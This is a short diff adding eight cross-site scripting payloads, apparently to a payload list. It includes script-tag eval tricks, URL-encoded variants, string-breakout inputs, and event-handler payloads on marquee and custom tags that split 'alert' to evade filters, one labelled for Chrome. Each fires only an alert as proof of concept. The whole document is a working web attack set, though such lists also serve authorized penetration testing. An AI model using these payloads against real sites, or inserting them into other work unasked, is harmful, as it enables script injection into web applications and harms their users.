@@ -1,0 +1,8 @@
+<script>for((i)in(self))eval(i)(1)</script>
+%3Cscript%3Eeval(%22al%22%2b%22ert()%22)%3C/script%3E
+<script>eval("al"%2b"ert()")</script>
+";alert();var a="
+';alert();var a='
+%3Cmarquee%20loop=1%20width=%271%26apos;%27onfinish=self[`al`+`ert`](1)%3E%23leet%3C/marquee%3E
+FOR CHROME:
+%3Cx%20y=1%20z=%271%26apos;%27onclick=self[`al`%2B`ert`](1)%3E%23CLICK%20MEE
